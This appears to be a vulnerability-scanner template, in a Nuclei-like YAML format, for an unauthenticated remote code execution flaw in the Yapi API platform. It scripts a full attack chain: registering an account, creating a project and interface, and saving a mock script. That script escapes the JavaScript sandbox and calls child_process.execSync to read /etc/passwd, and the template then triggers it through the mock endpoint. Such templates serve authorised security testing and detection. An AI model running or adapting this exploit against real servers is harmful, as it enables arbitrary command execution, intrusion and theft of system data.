id: yapi-rce
brief:
    title: Yapi - Remote Code Execution
    by: pikpikcu
    level: critical
    about: Yapi allows remote unauthenticated attackers to cause the product to execute arbitrary code.
    label:
        - yapi
        - rce
        - intrusive
        - vuln
    score: CVSS:10.0
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/api/user/reg'
      head:
        Content-Type: application/json;charset=UTF-8
      body: '{"email":"{{randstr}}@interact.sh","password":"{{randstr}}","username":"{{randstr}}"}'
      signs:
        - "on": status
          status:
            - 200
    - verb: GET
      to:
        - '{{BaseURL}}/api/group/list'
      head:
        Content-Type: application/json, text/plain, */*
      signs:
        - "on": status
          status:
            - 200
    - verb: POST
      to:
        - '{{BaseURL}}/api/project/add'
      head:
        Content-Type: application/json;charset=UTF-8
      body: '{"name":"{{randstr}}","basepath":"","group_id":"{{group_id}}","icon":"code-o","color":"cyan","project_type":"private"}'
      signs:
        - "on": status
          status:
            - 200
    - verb: GET
      to:
        - '{{BaseURL}}/api/project/get?id={{project_id}}'
      signs:
        - "on": status
          status:
            - 200
    - verb: POST
      to:
        - '{{BaseURL}}/api/interface/add'
      head:
        Content-Type: application/json;charset=UTF-8
      body: '{"method":"GET","catid":"{{project_id}}","title":"{{randstr_1}}","path":"/{{randstr_1}}","project_id":{{project_id}}}'
      signs:
        - "on": status
          status:
            - 200
    - verb: POST
      to:
        - '{{BaseURL}}/api/plugin/advmock/save'
      head:
        Content-Type: application/json;charset=UTF-8
      body: '{"project_id":"{{project_id}}","interface_id":"{{interface_id}}","mock_script":"const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor(''return process'')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync(\"cat /etc/passwd\").toString()","enable":true}'
      signs:
        - "on": status
          status:
            - 200
    - verb: GET
      to:
        - '{{BaseURL}}/mock/{{project_id}}/{{randstr_1}}'
      signs:
        - "on": status
          status:
            - 200
